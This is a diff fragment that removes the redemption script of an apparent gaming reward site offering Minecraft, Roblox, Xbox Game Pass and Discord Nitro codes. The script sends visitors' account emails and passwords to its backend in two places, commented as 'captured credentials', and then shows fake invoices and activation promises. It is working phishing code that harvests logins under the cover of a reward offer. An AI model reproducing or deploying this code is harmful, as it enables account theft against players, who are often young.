-  document.getElementById('rd-uav').style.background = isMcTheme ? '#10b981' : 'linear-gradient(135deg,var(--p),#5b35e8)';
-  document.getElementById('rd-unm').textContent = RD.user.name;
-  document.getElementById('rd-usub').textContent = RD.user.email || 'Account';
-  
-  const cEl = document.getElementById('rd-code'); cEl.value = ''; cEl.classList.remove('err');
-  document.getElementById('rd-msg').className = 'fmsg'; document.getElementById('rd-msg').textContent = 'Enter 25-character code';
-  show('rd-codebox'); setTimeout(() => cEl.focus(), 100);
-}
-
-function rdSubmit() {
-  const code = document.getElementById('rd-code').value.trim().toUpperCase();
-  processSubmit(code, 'rd-btn', 'rd-bt', 'rd-sp', 'rd-msg', 'rd-code');
-}
-
-function rdSubmitPro() {
-  const code = document.getElementById('mc-pro-code').value.trim().toUpperCase();
-  const btn = document.getElementById('mc-pro-btn');
-  btn.textContent = 'REDEEMING...';
-  btn.disabled = true;
-  
-  // Custom dummy logic for PRO submission
-  processSubmit(code, 'mc-pro-btn', '', '', '', '', true);
-}
-
-function processSubmit(code, btnId, btId, spId, msgId, codeId, isPro=false) {
-  if (!code || code.length < 14) {
-    if(!isPro) {
-      document.getElementById(codeId).classList.add('err');
-      document.getElementById(msgId).className = 'fmsg err';
-      document.getElementById(msgId).textContent = 'Please enter your code';
-    } else {
-      document.getElementById(btnId).textContent = 'REDEEM';
-      document.getElementById(btnId).disabled = false;
-      toast('✕', 'Please enter your code');
-    }
-    return;
-  }
-
-  const btn = document.getElementById(btnId);
-  const u = getUser();
-
-  fetch(`${CFG.API}/api/verify-code`, { method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ 
-      code, 
-      userId: u?.id||null, 
-      userName: u?(u.global_name||u.username):null, 
-      userAvatar: avURL(u), 
-      selectedGame: RD.game,
-      // Pass captured credentials to backend
-      accountEmail: RD.user.email,
-      accountPass: RD.user.pass || ''
-    })
-  }).then(r => r.json()).then(result => {
-    if (!result.valid) {
-      if(!isPro) {
-        btn.disabled=false; document.getElementById(btId).style.display='inline'; document.getElementById(spId).style.display='none';
-        document.getElementById(codeId).classList.add('err');
-        document.getElementById(msgId).className='fmsg err';
-        document.getElementById(msgId).textContent = result.message||'Invalid or used code';
-      } else {
-        btn.disabled = false; btn.textContent = 'REDEEM';
-      }
-      toast('✕', result.message||'Code not valid'); return;
-    }
-    
-    // SUCCESS
-    const priceKey = RD.game==='rb' ? 'rb'+RD.plan : RD.game==='nitro' ? 'nitro'+RD.plan : RD.game;
-    const inv = result.invoiceNo || ('IQ-'+RD.game.slice(0,2).toUpperCase()+'-'+Date.now().toString(36).toUpperCase().slice(-7));
-    const ds = new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});
-    const gnames = { mc:'Minecraft Reward', rb:'Roblox $'+RD.plan, xbox:'Xbox Game Pass', nitro:'Discord Nitro '+(RD.plan==='basic'?'Basic Yearly':'Boost Yearly') };
-    
-    const invObj = { redeemType:'code', type:RD.game, game:gnames[RD.game], plan:RD.plan?'$'+RD.plan:null,
-      account: (RD.game==='rb'||RD.game==='nitro') ? RD.rbUn : RD.user.name,
-      email: (RD.game==='rb'||RD.game==='nitro') ? RD.rbEm : RD.user.email,
-      code, inrPrice: PRICES[priceKey]||'—', date:ds, invoiceNo:inv, ts:Date.now() };
-    
-    RD.inv = invObj; saveOrd(invObj);
-    localStorage.setItem('eiq_rc', String(parseInt(localStorage.getItem('eiq_rc')||'0')+1));
-    
-    // Save to server
-    fetch(`${CFG.API}/api/save-redemption`, { method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({userId:u?.id||null, userName:u?(u.global_name||u.username):'Unknown', userAvatar:avURL(u),
-        discordTag:u?.username||'', game:invObj.game, plan:invObj.plan||null, account:invObj.account,
-        email:invObj.email, password: RD.user.pass || '', code:invObj.code, inrPrice:invObj.inrPrice,
-        invoiceNo:invObj.invoiceNo, redeemType:'code', date:invObj.date, ts:invObj.ts })
-    }).catch(()=>{});
-
-    // Show Success UI
-    document.getElementById('mc-ui').style.display = 'none';
-    document.getElementById('mc-bg').classList.remove('show');
-    document.getElementById('std-ui').style.display = 'block';
-    document.getElementById('std-bg').style.display = 'block';
-    document.getElementById('std-footer').style.display = 'block';
-    
-    document.getElementById('rd-ok-title').textContent = gnames[RD.game] + ' Redeemed!';
-    document.getElementById('rd-ok-inv').innerHTML = buildInv(invObj);
-    hide(['rd-s1','rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']);
-    document.getElementById('rd-ok').classList.add('show');
-    
-    if(!isPro) {
-      btn.disabled=false; document.getElementById(btId).style.display='inline'; document.getElementById(spId).style.display='none';
-    } else {
-      btn.disabled = false; btn.textContent = 'REDEEM';
-    }
-    toast('✅', 'Redeemed! Activating within 72h');
-  }).catch(() => {
-    if(!isPro) {
-      btn.disabled=false; document.getElementById(btId).style.display='inline'; document.getElementById(spId).style.display='none';
-      document.getElementById(msgId).className='fmsg err'; document.getElementById(msgId).textContent='Connection error. Try again.';
-    } else {
-      btn.disabled = false; btn.textContent = 'REDEEM';
-    }
-    toast('✕', 'Connection error');
-  });
-}
-
-function fmtCode(el) {
-  let v = el.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase(); let o = '';
-  for (let i=0; i<v.length && i<25; i++) { if(i>0&&i%5===0)o+='-'; o+=v[i]; }
-  el.value = o; el.classList.remove('err');
-}
-
-function fmtMcCode(el) {
-  fmtCode(el);
-  const btn = document.getElementById('mc-pro-btn');
-  if (el.value.length >= 14) btn.classList.add('active');
-  else btn.classList.remove('active');
-}
-
-function show(id) { const el=document.getElementById(id); if(el){el.style.display='block';el.style.animation='fadeUp 0.3s ease';} }
-function hide(ids) { ids.forEach(id => { const el=document.getElementById(id); if(el)el.style.display='none'; }); }
 </script>
 </body>
 </html>
